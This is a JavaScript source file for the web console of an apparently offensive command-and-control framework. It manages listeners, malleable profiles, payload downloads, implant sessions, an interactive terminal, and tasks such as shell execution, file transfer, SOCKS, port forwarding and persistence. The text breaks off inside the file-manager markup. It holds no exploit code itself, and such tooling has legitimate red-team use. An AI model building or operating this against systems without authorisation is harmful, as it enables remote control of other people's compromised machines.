// C2 模块前端逻辑 - 完整实现
// 支持: xterm 终端、文件管理、监听器/会话/任务/事件/Payload/Profile 管理

(function() {
    'use strict';

    // C2 模块命名空间
    const C2 = {
        currentPage: '',
        listeners: [],
        sessions: [],
        tasks: [],
        tasksPage: 1,
        tasksPageSize: 10,
        tasksTotal: 0,
        tasksPendingQueuedCount: null,
        events: [],
        eventsPage: 1,
        eventsPageSize: 10,
        eventsTotal: 0,
        profiles: [],
        selectedSessionId: null,
        selectedListenerId: null,
        eventSource: null,
        // xterm 相关
        terminalInstance: null,
        terminalFitAddon: null,
        terminalResizeObserver: null,
        terminalContainer: null,
        terminalSessionId: null,
        terminalHistory: {},
        terminalLogs: {},
        terminalBusy: false,
        terminalQueue: [],
        // 文件管理
        currentPath: '.',
        implantPwd: null,
        fileList: [],
        fileUploadBusy: false,
        // 任务轮询
        taskPollInterval: null,
    };

    // API 基础路径
    const API_BASE = '/api/c2';

    window.__c2DownloadPayload = function(filename) {
        const url = `${API_BASE}/payloads/${filename}/download`;
        const fetchFn = (typeof apiFetch === 'function') ? apiFetch : fetch;
        fetchFn(url).then(resp => {
            if (!resp.ok) throw new Error('download failed: ' + resp.status);
            return resp.blob();
        }).then(blob => {
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            a.remove();
            URL.revokeObjectURL(a.href);
        }).catch(err => {
            if (window.showToast) window.showToast(err.message, 'error');
        });
    };

    function c2t(key, opts) {
        try {
            if (typeof window.t === 'function') return window.t(key, opts || {});
        } catch (e) {}
        return key;
    }

    function listenerTypeLabel(type) {
        if (!type) return '';
        const k = 'c2.listeners.typeLabels.' + String(type).toLowerCase();
        const tr = c2t(k);
        if (tr !== k) return tr;
        return String(type).replace(/_/g, ' ');
    }

    function sessionStatusLabel(status) {
        const s = String(status || '').toLowerCase();
        if (!s) return '';
        const k = 'c2.sessions.' + s;
        const tr = c2t(k);
        if (tr !== k) return tr;
        return status;
    }

    function taskStatusLabel(status) {
        const s = String(status || '').toLowerCase();
        if (!s) return '';
        const k = 'c2.tasks.' + s;
        const tr = c2t(k);
        if (tr !== k) return tr;
        return status;
    }

    function formatTaskCommand(task) {
        if (!task) return '';
        const type = String(task.taskType || '').toLowerCase();
        const p = task.payload;
        if (!p || typeof p !== 'object' || Object.keys(p).length === 0) {
            if (type === 'pwd' || type === 'ps' || type === 'screenshot') return type;
            return '';
        }
        switch (type) {
            case 'shell':
            case 'exec':
                return p.command != null ? String(p.command) : '';
            case 'ls':
            case 'cd':
                return p.path != null ? String(p.path) : '';
            case 'download':
                return p.remote_path != null ? String(p.remote_path) : '';
            case 'upload':
                if (p.remote_path) return String(p.remote_path);
                if (p.file_id) return 'file:' + String(p.file_id);
                return '';
            case 'kill_proc':
                return p.pid != null ? 'pid:' + String(p.pid) : '';
            case 'sleep':
                let sleepStr = p.seconds != null ? 'sleep ' + p.seconds + 's' : '';
                if (p.jitter != null) sleepStr += (sleepStr ? ', ' : '') + 'jitter ' + p.jitter + '%';
                return sleepStr;
            case 'port_fwd':
                return [p.action, p.remote_host, p.remote_port, p.local_port].filter(v => v != null && v !== '').join(':');
            case 'socks_start':
            case 'socks_stop':
                return p.port != null ? 'port:' + String(p.port) : type;
            case 'load_assembly':
                if (p.args) return String(p.args);
                if (p.file_id) return 'file:' + String(p.file_id);
                return '';
            case 'persist':
                return p.method != null ? String(p.method) : '';
            default:
                try { return JSON.stringify(p); } catch (e) { return ''; }
        }
    }

    function truncateCommand(cmd, maxLen) {
        if (!cmd) return '';
        const s = String(cmd);
        if (!maxLen || s.length <= maxLen) return s;
        return s.substring(0, maxLen - 1) + '\u2026';
    }

    // ============================================================================
    // 工具函数
    // ============================================================================

    function apiRequest(method, url, data) {
        const options = {
            method: method,
            headers: { 'Content-Type': 'application/json' }
        };
        if (data && (method === 'POST' || method === 'PUT' || method === 'PATCH' || method === 'DELETE')) {
            options.body = JSON.stringify(data);
        }
        if (typeof apiFetch === 'function') {
            return apiFetch(url, options).then(r => r.json());
        }
        return fetch(url, options).then(r => r.json());
    }

    function showToast(message, type = 'info') {
        if (window.showToast) {
            window.showToast(message, type);
            return;
        }
        const container = document.getElementById('c2-toast-container') || (() => {
            const div = document.createElement('div');
            div.id = 'c2-toast-container';
            div.style.cssText = 'position:fixed;top:20px;right:20px;z-index:10100;display:flex;flex-direction:column;gap:8px;';
            document.body.appendChild(div);
            return div;
        })();
        container.style.zIndex = '10100';
        const toast = document.createElement('div');
        const colors = { error: '#e53e3e', success: '#38a169', info: '#3182ce', warn: '#d69e2e' };
        toast.style.cssText = `background:${colors[type] || colors.info};color:#fff;padding:10px 18px;border-radius:6px;font-size:0.875rem;box-shadow:0 4px 12px rgba(0,0,0,0.2);opacity:0;transition:opacity .3s;max-width:400px;word-break:break-word;`;
        toast.textContent = message;
        container.appendChild(toast);
        requestAnimationFrame(() => { toast.style.opacity = '1'; });
        setTimeout(() => {
            toast.style.opacity = '0';
            setTimeout(() => toast.remove(), 300);
        }, 3500);
    }

    function formatTime(dateStr) {
        if (!dateStr) return '-';
        return new Date(dateStr).toLocaleString();
    }

    function formatDuration(ms) {
        if (!ms || ms <= 0) return '-';
        if (ms < 1000) return c2t('c2.fmt.durationMs', { n: ms });
        if (ms < 60000) return c2t('c2.fmt.durationSec', { n: (ms / 1000).toFixed(1) });
        return c2t('c2.fmt.durationMin', { n: (ms / 60000).toFixed(1) });
    }

    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    /** 任务列表操作按钮（查看/取消/删除）— 事件委托 */
    function bindC2TaskActionDelegation() {
        if (document.documentElement.dataset.c2TaskActionsBound === '1') return;
        document.documentElement.dataset.c2TaskActionsBound = '1';
        document.addEventListener('click', function(e) {
            const btn = e.target.closest('[data-c2-task-action]');
            if (!btn) return;
            e.preventDefault();
            e.stopPropagation();
            const action = btn.getAttribute('data-c2-task-action');
            const id = btn.getAttribute('data-task-id');
            if (!id) return;
            if (action === 'view') C2.viewTask(id);
            else if (action === 'cancel') C2.cancelTask(id);
            else if (action === 'delete') C2.deleteTaskById(id);
        });
    }
    bindC2TaskActionDelegation();

    /** 监听器表单：Malleable Profile 下拉选项 HTML（value / 文本已转义） */
    function listenerProfileSelectHtml(selectedProfileId) {
        const sel = selectedProfileId ? String(selectedProfileId) : '';
        let opts = `<option value="">${escapeHtml(c2t('c2.listeners.malleableProfileNone'))}</option>`;
        for (const p of (C2.profiles || [])) {
            if (!p) continue;
            const pid = p.id || p.ID;
            if (!pid) continue;
            const idEsc = escapeHtml(String(pid));
            const nameEsc = escapeHtml(p.name || pid);
            const selected = sel && String(pid) === sel ? ' selected' : '';
            opts += `<option value="${idEsc}"${selected}>${nameEsc}</option>`;
        }
        return opts;
    }

    function listenerResolvedProfileId(l) {
        if (!l) return '';
        const v = l.profileId != null && l.profileId !== '' ? l.profileId : l.profile_id;
        return v != null ? String(v).trim() : '';
    }

    /** 监听器卡片展示用 Profile 名称（依赖 C2.profiles，由 loadListeners 一并拉取） */
    function listenerProfileDisplayName(l) {
        const pid = listenerResolvedProfileId(l);
        if (!pid) return '';
        const list = C2.profiles || [];
        for (let i = 0; i < list.length; i++) {
            const p = list[i];
            if (p && (p.id === pid || p.ID === pid)) return String(p.name || p.id || pid).trim() || pid;
        }
        return pid.length > 18 ? pid.substring(0, 16) + '…' : pid;
    }

    function listenerTypeVisualClass(type) {
        const t = String(type || '').toLowerCase();
        if (t === 'https_beacon') return 'c2-ltype-mark--https';
        if (t === 'http_beacon') return 'c2-ltype-mark--http';
        if (t === 'tcp_reverse') return 'c2-ltype-mark--tcp';
        if (t === 'websocket') return 'c2-ltype-mark--ws';
        return 'c2-ltype-mark--def';
    }

    function listenerTypeShortLabel(type) {
        const t = String(type || '').toLowerCase();
        if (t === 'https_beacon') return 'HTTPS';
        if (t === 'http_beacon') return 'HTTP';
        if (t === 'tcp_reverse') return 'TCP';
        if (t === 'websocket') return 'WS';
        return '?';
    }

    function listenerCardStatusPillLabel(status) {
        const s = String(status || '').toLowerCase();
        if (s === 'running') return c2t('c2.listeners.running');
        if (s === 'stopped') return c2t('c2.listeners.stopped');
        if (s === 'error') return c2t('c2.listeners.statusError');
        return c2t('c2.listeners.stopped');
    }

    /** 避免 i18n 插值把日期里的「/」转成 &#x2F;，与 formatTime 拼接后整体转义 */
    function formatListenerStartedHtml(dateStr) {
        if (!dateStr) return '';
        const prefix = c2t('c2.listeners.startedAtPrefix');
        const time = formatTime(dateStr);
        return '<div class="c2-listener-meta-row"><span class="c2-listener-meta-label">' + escapeHtml(prefix) + '</span> <span class="c2-listener-meta-time">' + escapeHtml(time) + '</span></div>';
    }

    function copyToClipboard(text) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => showToast(c2t('c2.clipboardCopied'), 'success'));
        } else {
            const ta = document.createElement('textarea');
            ta.value = text;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            showToast(c2t('c2.clipboardCopied'), 'success');
        }
    }

    // ============================================================================
    // 页面初始化
    // ============================================================================

    C2.init = function() {
        const pageId = window.currentPageId || '';
        
        if (pageId.startsWith('c2')) {
            C2.connectEventStream();
        }

        switch(pageId) {
            case 'c2-listeners':
                C2.loadListeners();
                break;
            case 'c2-sessions':
                C2.loadSessions();
                C2.ensureListenersLoaded();
                break;
            case 'c2-tasks':
                C2.loadTasks();
                break;
            case 'c2-payloads':
                C2.loadListenersForPayload();
                break;
            case 'c2-events':
                C2.loadEvents();
                break;
            case 'c2-profiles':
                C2.loadProfiles();
                break;
        }
    };

    // ============================================================================
    // 监听器管理
    // ============================================================================

    C2.ensureListenersLoaded = function() {
        if (C2.listeners && C2.listeners.length > 0) {
            return Promise.resolve(C2.listeners);
        }
        return apiRequest('GET', `${API_BASE}/listeners`).then(function(data) {
            C2.listeners = (data && data.listeners) || [];
            return C2.listeners;
        });
    };

    C2.loadListeners = function() {
        Promise.all([
            apiRequest('GET', `${API_BASE}/listeners`),
            apiRequest('GET', `${API_BASE}/profiles`).catch(function() { return {}; })
        ]).then(function(results) {
            var ldata = results[0];
            var pdata = results[1];
            C2.listeners = (ldata && ldata.listeners) || [];
            if (pdata && pdata.profiles && !pdata.error) {
                C2.profiles = pdata.profiles;
            }
            C2.renderListeners();
        });
    };

    /** 拉取 Profile 列表（监听器表单用）；失败时置空列表不阻断弹窗 */
    C2.ensureProfilesLoaded = function() {
        return apiRequest('GET', `${API_BASE}/profiles`).then(data => {
            if (data && data.error) {
                C2.profiles = [];
                return C2.profiles;
            }
            C2.profiles = (data && data.profiles) || [];
            return C2.profiles;
        });
    };

    C2.renderListeners = function() {
        const container = document.getElementById('c2-listener-grid');
        if (!container) return;

        if (C2.listeners.length === 0) {
            container.innerHTML = `
                <div class="c2-empty">
                    <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="1.2" style="margin-bottom:16px;opacity:0.6;">
                        <path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"></path>
                        <path d="M12 15l-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"></path>
                        <path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"></path>
                        <path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"></path>
                    </svg>
                    <h3 style="margin-bottom:8px;font-size:18px;font-weight:700;">${escapeHtml(c2t('c2.listeners.emptyTitle'))}</h3>
                    <p style="font-size:14px;">${escapeHtml(c2t('c2.listeners.emptyHint'))}</p>
                    <button class="btn-primary" onclick="C2.showCreateListenerModal()" style="margin-top:20px;">
                        ${escapeHtml(c2t('c2.listeners.headerCreateBtn'))}
                    </button>
                </div>`;
            return;
        }

        container.innerHTML = C2.listeners.map(function(l) {
            const st = String(l.status || 'stopped').toLowerCase();
            const stUi = st === 'running' || st === 'stopped' || st === 'error' ? st : 'stopped';
            const profilePid = listenerResolvedProfileId(l);
            const profileName = listenerProfileDisplayName(l);
            const profileBadge = profilePid
                ? '<div class="c2-listener-profile-badge" title="' + escapeHtml(c2t('c2.listeners.profileBadgeTitle')) + '"><span class="c2-listener-profile-dot" aria-hidden="true"></span><span>' + escapeHtml(profileName) + '</span></div>'
                : '';
            const cb = C2.getListenerCallbackHost(l);
            const cbRow = cb
                ? '<div class="c2-listener-kv"><span class="c2-listener-kv-label">' + escapeHtml(c2t('c2.listeners.callbackShort')) + '</span><span class="c2-listener-kv-val c2-listener-mono">' + escapeHtml(cb) + '</span></div>'
                : '';
            const remarkRow = l.remark ? '<div class="c2-listener-remark">' + escapeHtml(l.remark) + '</div>' : '';
            const startedHtml = formatListenerStartedHtml(l.startedAt);
            const pillLabel = escapeHtml(listenerCardStatusPillLabel(st));
            const typeMark = escapeHtml(listenerTypeShortLabel(l.type));
            const typeVis = listenerTypeVisualClass(l.type);
            const fullType = escapeHtml(listenerTypeLabel(l.type));
            const bindVal = escapeHtml(String(l.bindHost)) + ':' + escapeHtml(String(l.bindPort));

            return `
            <article class="c2-listener-card c2-listener-card--${stUi}" data-listener-id="${escapeHtml(l.id)}">
                <div class="c2-listener-card-head">
                    <div class="c2-ltype-mark ${typeVis}" title="${fullType}"><span>${typeMark}</span></div>
                    <div class="c2-listener-card-head-main">
                        <div class="c2-listener-card-title-row">
                            <h3 class="c2-listener-name">${escapeHtml(l.name)}</h3>
                            <span class="c2-listener-pill c2-listener-pill--${stUi}">${pillLabel}</span>
                        </div>
                        <div class="c2-listener-id-row">
                            <code class="c2-listener-id-full" title="${escapeHtml(l.id)}">${escapeHtml(l.id)}</code>
                        </div>
                    </div>
                </div>
                <div class="c2-listener-card-body">
                    <div class="c2-listener-kv">
                        <span class="c2-listener-kv-label">${escapeHtml(c2t('c2.listeners.bindEndpoint'))}</span>
                        <span class="c2-listener-kv-val c2-listener-mono"><span class="c2-status-dot ${escapeHtml(st)}"></span>${bindVal}</span>
                    </div>
                    ${cbRow}
                    ${profileBadge}
                    ${remarkRow}
                    ${startedHtml}
                </div>
                <div class="c2-listener-card-actions">
                    ${l.status === 'stopped'
                        ? `<button type="button" class="btn-primary btn-sm" onclick="C2.startListener('${l.id}')">▶ ${escapeHtml(c2t('c2.listeners.start'))}</button>`
                        : `<button type="button" class="btn-secondary btn-sm" onclick="C2.stopListener('${l.id}')">⏹ ${escapeHtml(c2t('c2.listeners.stop'))}</button>`
                    }
                    <button type="button" class="btn-secondary btn-sm" onclick="C2.editListener('${l.id}')">${escapeHtml(c2t('c2.listeners.edit'))}</button>
                    <button type="button" class="btn-danger btn-sm" onclick="C2.deleteListener('${l.id}')">${escapeHtml(c2t('c2.listeners.delete'))}</button>
                </div>
            </article>`;
        }).join('');
    };

    C2.getListenerCallbackHost = function(l) {
        if (!l) return '';
        try {
            var raw = l.configJson != null ? l.configJson : '{}';
            var j = typeof raw === 'string' ? JSON.parse(raw || '{}') : (raw || {});
            return String(j.callback_host || '').trim();
        } catch (e) {
            return '';
        }
    };

    C2.showCreateListenerModal = function() {
        const modal = document.getElementById('c2-modal');
        const content = document.getElementById('c2-modal-content');
        if (!content || !modal) return;

        modal.style.display = 'flex';
        content.innerHTML = `
            <div class="c2-modal-header">
                <h3>${escapeHtml(c2t('c2.listeners.modalCreateTitle'))}</h3>
                <button class="c2-modal-close" onclick="C2.closeModal()">&times;</button>
            </div>
            <div class="c2-modal-body">
                <p class="form-hint" style="margin-top:0;">${escapeHtml(c2t('c2.listeners.loadingProfiles'))}</p>
            </div>
        `;

        C2.ensureProfilesLoaded().then(() => {
            const profileOpts = listenerProfileSelectHtml('');
            const emptyProfHintCreate = (C2.profiles && C2.profiles.length > 0)
                ? ''
                : `<div class="form-hint" style="margin-bottom:6px;color:#b45309;">${escapeHtml(c2t('c2.listeners.malleableProfileEmptyListHint'))}</div>`;
            content.innerHTML = `
            <div class="c2-modal-header">
                <h3>${escapeHtml(c2t('c2.listeners.modalCreateTitle'))}</h3>
                <button class="c2-modal-close" onclick="C2.closeModal()">&times;</button>
            </div>
            <div class="c2-modal-body">
                <div class="c2-form-row">
                    <div class="c2-form-group">
                        <label>${escapeHtml(c2t('c2.listeners.name'))}</label>
                        <input type="text" id="c2-listener-name" class="form-control" placeholder="${escapeHtml(c2t('c2.listeners.placeholderNameExample'))}">
                    </div>
                    <div class="c2-form-group">
                        <label>${escapeHtml(c2t('c2.listeners.type'))}</label>
                        <select id="c2-listener-type" class="form-control c2-native-select" onchange="C2.syncListenerProfileRowForType()">
                            <option value="http_beacon">HTTP Beacon</option>
                            <option value="https_beacon">HTTPS Beacon</option>
                            <option value="tcp_reverse">TCP Reverse</option>
                            <option value="websocket">WebSocket</option>
                        </select>
                    </div>
                </div>
                <div class="c2-form-row">
                    <div class="c2-form-group">
                        <label>${escapeHtml(c2t('c2.listeners.bindHost'))}</label>
                        <input type="text" id="c2-listener-host" class="form-control" value="127.0.0.1">
                        <div class="form-hint">${escapeHtml(c2t('c2.listeners.bindHintExternal'))}</div>
                    </div>
                    <div class="c2-form-group">
                        <label>${escapeHtml(c2t('c2.listeners.bindPort'))}</label>
                        <input type="number" id="c2-listener-port" class="form-control" placeholder="8443">
                    </div>
                </div>
                <div class="c2-form-group" id="c2-listener-profile-group">
                    <label>${escapeHtml(c2t('c2.listeners.malleableProfile'))}</label>
                    ${emptyProfHintCreate}
                    <select id="c2-listener-profile-id" class="form-control c2-native-select">${profileOpts}</select>
                    <div class="form-hint">${escapeHtml(c2t('c2.listeners.malleableProfileHint'))}</div>
                </div>
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.listeners.callbackHost'))}</label>
                    <input type="text" id="c2-listener-callback-host" class="form-control" placeholder="">
                    <div class="form-hint">${escapeHtml(c2t('c2.listeners.callbackHostHint'))}</div>
                </div>
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.listeners.remark'))}</label>
                    <input type="text" id="c2-listener-remark" class="form-control" placeholder="${escapeHtml(c2t('c2.listeners.placeholderRemarkLong'))}">
                </div>
            </div>
            <div class="c2-modal-footer">
                <button class="btn-secondary" onclick="C2.closeModal()">${escapeHtml(c2t('common.cancel'))}</button>
                <button class="btn-primary" onclick="C2.createListener()">${escapeHtml(c2t('c2.listeners.submitCreate'))}</button>
            </div>
        `;
            C2.syncListenerProfileRowForType();
        }).catch(() => {
            showToast(c2t('c2.listeners.toastProfilesLoadFailed'), 'error');
            C2.closeModal();
        });
    };

    /** 非 HTTP/HTTPS Beacon 时隐藏 Profile 行（避免误以为 TCP 等也会用） */
    C2.syncListenerProfileRowForType = function() {
        const typeEl = document.getElementById('c2-listener-type');
        const row = document.getElementById('c2-listener-profile-group');
        if (!typeEl || !row) return;
        const t = String(typeEl.value || '').toLowerCase();
        const show = t === 'http_beacon' || t === 'https_beacon';
        row.style.display = show ? '' : 'none';
        if (!show) {
            const sel = document.getElementById('c2-listener-profile-id');
            if (sel) sel.value = '';
        }
    };

    C2.createListener = function() {
        const name = document.getElementById('c2-listener-name')?.value.trim();
        const type = document.getElementById('c2-listener-type')?.value;
        const bindHost = document.getElementById('c2-listener-host')?.value || '127.0.0.1';
        const bindPort = parseInt(document.getElementById('c2-listener-port')?.value);
        const callbackHost = document.getElementById('c2-listener-callback-host')?.value?.trim() || '';
        const remark = document.getElementById('c2-listener-remark')?.value;

        if (!name || !type || !bindPort) {
            showToast(c2t('c2.listeners.toastFillRequired'), 'error');
            return;
        }

        const profileId = (document.getElementById('c2-listener-profile-id')?.value || '').trim();

        apiRequest('POST', `${API_BASE}/listeners`, {
            name, type, bind_host: bindHost, bind_port: bindPort, remark,
            callback_host: callbackHost,
            profile_id: profileId
        }).then(data => {
            if (data.error) {
                showToast(data.error, 'error');
            } else {
                showToast(c2t('c2.listeners.toastCreated'), 'success');
                C2.closeModal();
                C2.loadListeners();
            }
        });
    };

    C2.startListener = function(id) {
        apiRequest('POST', `${API_BASE}/listeners/${id}/start`, {}).then(data => {
            if (data.error) showToast(data.error, 'error');
            else {
                showToast(c2t('c2.listeners.toastStarted'), 'success');
                C2.loadListeners();
            }
        });
    };

    C2.stopListener = function(id) {
        apiRequest('POST', `${API_BASE}/listeners/${id}/stop`, {}).then(data => {
            if (data.error) showToast(data.error, 'error');
            else {
                showToast(c2t('c2.listeners.toastStopped'), 'success');
                C2.loadListeners();
            }
        });
    };

    C2.deleteListener = function(id) {
        if (!confirm(c2t('c2.listeners.confirmDelete'))) return;
        apiRequest('DELETE', `${API_BASE}/listeners/${id}`, {}).then(data => {
            showToast(c2t('c2.listeners.toastDeleted'), 'success');
            C2.loadListeners();
        });
    };

    C2.editListener = function(id) {
        const l = C2.listeners.find(x => x.id === id);
        if (!l) return;

        const cbHost = C2.getListenerCallbackHost(l);
        const modal = document.getElementById('c2-modal');
        const content = document.getElementById('c2-modal-content');
        if (!content || !modal) return;

        modal.style.display = 'flex';
        content.innerHTML = `
            <div class="c2-modal-header">
                <h3>${escapeHtml(c2t('c2.listeners.editTitle'))}</h3>
                <button class="c2-modal-close" onclick="C2.closeModal()">&times;</button>
            </div>
            <div class="c2-modal-body">
                <p class="form-hint" style="margin-top:0;">${escapeHtml(c2t('c2.listeners.loadingProfiles'))}</p>
            </div>
        `;

        C2.ensureProfilesLoaded().then(() => {
            const resolvedPid = listenerResolvedProfileId(l);
            const profileOpts = listenerProfileSelectHtml(resolvedPid);
            const lt = String(l.type || '').toLowerCase();
            const httpHint = (lt === 'http_beacon' || lt === 'https_beacon')
                ? ''
                : `<div class="form-hint" style="margin-bottom:6px;">${escapeHtml(c2t('c2.listeners.malleableProfileNonHttpHint'))}</div>`;
            const emptyProfHint = (C2.profiles && C2.profiles.length > 0)
                ? ''
                : `<div class="form-hint" style="margin-bottom:6px;color:#b45309;">${escapeHtml(c2t('c2.listeners.malleableProfileEmptyListHint'))}</div>`;
            content.innerHTML = `
            <div class="c2-modal-header">
                <h3>${escapeHtml(c2t('c2.listeners.editTitle'))}</h3>
                <button class="c2-modal-close" onclick="C2.closeModal()">&times;</button>
            </div>
            <div class="c2-modal-body">
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.listeners.name'))}</label>
                    <input type="text" id="c2-listener-name" class="form-control" value="${escapeHtml(l.name)}">
                </div>
                <div class="c2-form-row">
                    <div class="c2-form-group">
                        <label>${escapeHtml(c2t('c2.listeners.bindHost'))}</label>
                        <input type="text" id="c2-listener-host" class="form-control" value="${escapeHtml(String(l.bindHost))}">
                    </div>
                    <div class="c2-form-group">
                        <label>${escapeHtml(c2t('c2.listeners.bindPort'))}</label>
                        <input type="number" id="c2-listener-port" class="form-control" value="${l.bindPort}">
                    </div>
                </div>
                <div class="c2-form-group" id="c2-listener-profile-group">
                    <label>${escapeHtml(c2t('c2.listeners.malleableProfile'))}</label>
                    ${httpHint}${emptyProfHint}
                    <select id="c2-listener-profile-id" class="form-control c2-native-select">${profileOpts}</select>
                    <div class="form-hint">${escapeHtml(c2t('c2.listeners.malleableProfileHint'))}</div>
                </div>
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.listeners.callbackHost'))}</label>
                    <input type="text" id="c2-listener-callback-host" class="form-control" value="${escapeHtml(cbHost)}">
                    <div class="form-hint">${escapeHtml(c2t('c2.listeners.callbackHostHint'))}</div>
                </div>
                <div class="c2-form-group">
                    <label>${escapeHtml(c2t('c2.listeners.remark'))}</label>
                    <input type="text" id="c2-listener-remark" class="form-control" value="${escapeHtml(l.remark || '')}">
                </div>
            </div>
            <div class="c2-modal-footer">
                <button class="btn-secondary" onclick="C2.closeModal()">${escapeHtml(c2t('common.cancel'))}</button>
                <button class="btn-primary" onclick="C2.saveListener('${l.id}')">${escapeHtml(c2t('common.save'))}</button>
            </div>
        `;
        }).catch(() => {
            showToast(c2t('c2.listeners.toastProfilesLoadFailed'), 'error');
            C2.closeModal();
        });
    };

    C2.saveListener = function(id) {
        const name = document.getElementById('c2-listener-name')?.value.trim();
        const bindHost = document.getElementById('c2-listener-host')?.value;
        const bindPort = parseInt(document.getElementById('c2-listener-port')?.value);
        const callbackHost = document.getElementById('c2-listener-callback-host')?.value?.trim() ?? '';
        const remark = document.getElementById('c2-listener-remark')?.value;
        const profileEl = document.getElementById('c2-listener-profile-id');
        const profileId = profileEl ? String(profileEl.value || '').trim() : '';

        apiRequest('PUT', `${API_BASE}/listeners/${id}`, {
            name, bind_host: bindHost, bind_port: bindPort, remark,
            callback_host: callbackHost,
            profile_id: profileId
        }).then(data => {
            if (data.error) showToast(data.error, 'error');
            else {
                showToast(c2t('c2.listeners.toastUpdated'), 'success');
                C2.closeModal();
                C2.loadListeners();
            }
        });
    };

    // ============================================================================
    // 会话管理
    // ============================================================================

    C2.loadSessions = function() {
        return apiRequest('GET', `${API_BASE}/sessions`).then(data => {
            C2.sessions = data.sessions || [];
            C2.renderSessions();
        });
    };

    C2.renderSessions = function() {
        const list = document.getElementById('c2-session-list');
        const main = document.getElementById('c2-session-main');
        if (!list) return;

        if (C2.sessions.length === 0) {
            list.innerHTML = `
                <div class="c2-empty" style="padding:40px 20px;">
                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="1.2" style="margin-bottom:16px;opacity:0.5;">
                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
                        <line x1="8" y1="21" x2="16" y2="21"></line>
                        <line x1="12" y1="17" x2="12" y2="21"></line>
                    </svg>
                    <h3 style="font-size:16px;font-weight:700;margin-bottom:6px;">${escapeHtml(c2t('c2.sessions.emptyTitle'))}</h3>
                    <p style="font-size:13px;">${escapeHtml(c2t('c2.sessions.emptyHint'))}</p>
                </div>`;
            if (main) main.innerHTML = '';
            return;
        }

        list.innerHTML = C2.sessions.map(s => `
            <div class="c2-session-item ${s.id === C2.selectedSessionId ? 'active' : ''}" 
                 onclick="C2.selectSession('${s.id}')">
                <div class="c2-session-header">
                    <span class="c2-session-host">${escapeHtml(s.hostname || c2t('c2.sessions.unknownHost'))}</span>
                    <span class="c2-session-status ${s.status}">${escapeHtml(sessionStatusLabel(s.status))}</span>
                </div>
                <div class="c2-session-meta">
                    ${escapeHtml(s.username)} · ${s.os}/${s.arch}
                    ${s.isAdmin ? '<span style="color:#f59e0b;font-weight:700;margin-left:4px;">' + escapeHtml(c2t('c2.sessions.rootBadge')) + '</span>' : ''}
                </div>
                <div class="c2-session-meta" style="font-size:11px;margin-top:2px;">
                    ${s.internalIp || '-'} · PID ${s.pid}
                </div>
                <div class="c2-session-item-footer">
                    <span class="c2-session-meta c2-session-item-time">${formatTime(s.lastCheckIn)}</span>
                    <button type="button" class="c2-session-card-delete" onclick="event.stopPropagation(); C2.deleteSessionRecord('${s.id}');">${escapeHtml(c2t('c2.sessions.cardDeleteSession'))}</button>
                </div>
            </div>
        `).join('');

        if (C2.selectedSessionId && !C2.sessions.find(s => s.id === C2.selectedSessionId)) {
            C2.selectedSessionId = null;
        }
        if (!C2.selectedSessionId && C2.sessions.length > 0) {
            C2.selectSession(C2.sessions[0].id);
        }
    };

    C2.selectSession = function(id) {
        C2.selectedSessionId = id;
        C2.implantPwd = null;
        C2.currentPath = '.';
        C2.renderSessions();
        C2.renderSessionDetail(id);
    };

    C2.renderSessionDetail = function(id) {
        const container = document.getElementById('c2-session-main');
        if (!container) return;

        const s = C2.sessions.find(x => x.id === id);
        if (!s) return;

        const adminVal = s.isAdmin ? c2t('c2.sessions.adminYes') : c2t('c2.sessions.adminNo');
        const sleepLine = c2t('c2.sessions.infoSleepLine', { sec: s.sleepSeconds, jitter: s.jitterPercent });
        container.innerHTML = `
            <div class="c2-session-detail">
                <div class="c2-session-header-bar">
                    <div class="c2-session-title">
                        <h3>${escapeHtml(s.hostname)} <span class="c2-session-badge ${s.status}">${escapeHtml(sessionStatusLabel(s.status))}</span></h3>
                        <div class="c2-session-subtitle">${s.id} | ${escapeHtml(s.username)}@${s.os}/${s.arch}</div>
                    </div>
                    <div class="c2-session-actions">
                        <button class="btn-secondary btn-sm" onclick="C2.setSessionSleep('${s.id}')">${escapeHtml(c2t('c2.sessions.btnSleep'))}</button>
                        <button class="btn-danger btn-sm" onclick="C2.killSession('${s.id}')">${escapeHtml(c2t('c2.sessions.kill'))}</button>
                    </div>
                </div>
                
                <div class="c2-session-tabs">
                    <div class="c2-session-tab active" data-tab="terminal" onclick="C2.switchTab('terminal')">${escapeHtml(c2t('c2.sessions.terminal'))}</div>
                    <div class="c2-session-tab" data-tab="files" onclick="C2.switchTab('files')">${escapeHtml(c2t('c2.sessions.files'))}</div>
                    <div class="c2-session-tab" data-tab="tasks" onclick="C2.switchTab('tasks')">${escapeHtml(c2t('c2.sessions.tasks'))}</div>
                    <div class="c2-session-tab" data-tab="info" onclick="C2.switchTab('info')">${escapeHtml(c2t('c2.sessions.info'))}</div>
                </div>
                
                <div class="c2-session-tab-content">
                    <div id="c2-tab-terminal" class="c2-tab-panel active">
                        <div id="c2-terminal-container" class="c2-terminal-container"></div>
                        <div class="c2-terminal-toolbar">
                            <button class="btn-ghost btn-sm" onclick="C2.clearTerminal()">${escapeHtml(c2t('c2.sessions.clearTerminal'))}</button>
                            <button class="btn-ghost btn-sm" onclick="C2.copyTerminal()">${escapeHtml(c2t('common.copy'))}</button>
                            <span class="c2-terminal-status" id="c2-terminal-status">${escapeHtml(c2t('c2.sessions.termStatusReady'))}</span>
                        </div>
                    </div>
                    <div id="c2-tab-files" class="c2-tab-panel" style="display:none;">
                        <div class="c2-file-toolbar">
